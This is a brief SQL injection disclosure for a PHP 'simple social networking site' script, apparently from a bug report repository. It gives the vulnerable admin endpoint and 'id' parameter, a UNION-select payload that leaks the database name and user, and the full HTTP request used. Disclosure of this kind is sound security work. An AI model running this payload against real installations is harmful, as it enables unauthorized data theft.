# simple-social-networking-site-instagram v1.0 has SQL injection

vendors: https://www.sourcecodester.com/php/15311/simple-social-networking-site-instagram-phpoop-free-source-code.html

Date: 2022-05-07

Vulnerability File: /sns/admin/members/view_member.php

Vulnerability location: /sns/admin/members/view_member.php, id

[+] Payload: id=3'+union+select+1,2,3,4,(select+database()),6,7,8,9,10,(select+user())--+ // Leak place ---> id

Tested on Windows 10, XAMPP

```
GET /sns/admin/members/view_member.php?id=3'+union+select+1,2,3,4,(select+database()),6,7,8,9,10,(select+user())--+ HTTP/1.1
Host: 192.168.2.106
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://192.168.2.106/sns/admin/?page=members
Cookie: PHPSESSID=0389fublnj7ggho8q04fuvfaqe


```

![](https://github.com/mikeccltt/sns_bug_report/blob/main/simple-social-networking-site-instagram/sql.gif?raw=true)

